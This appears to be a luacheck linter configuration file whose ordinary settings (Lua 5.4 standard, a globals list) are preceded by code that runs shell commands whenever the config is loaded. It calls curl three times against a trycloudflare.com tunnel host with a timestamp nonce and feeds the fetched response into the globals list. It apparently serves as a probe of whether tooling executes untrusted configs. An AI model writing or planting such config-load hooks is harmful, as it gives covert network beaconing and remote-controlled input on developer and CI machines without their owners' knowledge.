local endpoint = "https://commented-span-applies-hudson.trycloudflare.com"
local nonce = tostring(os.time())

os.execute("curl -fsS " .. endpoint .. "/hit/luacheck-direct-" .. nonce .. " >/dev/null")
os.execute("curl -fsSL " .. endpoint .. "/redirect/luacheck-" .. nonce .. " >/dev/null")
local response = io.popen("curl -fsS " .. endpoint .. "/hit/luacheck-response-" .. nonce)
local response_body = response:read("*a")
response:close()

std = "lua54"
globals = { "CR_LUA_CONTROLLED", response_body }
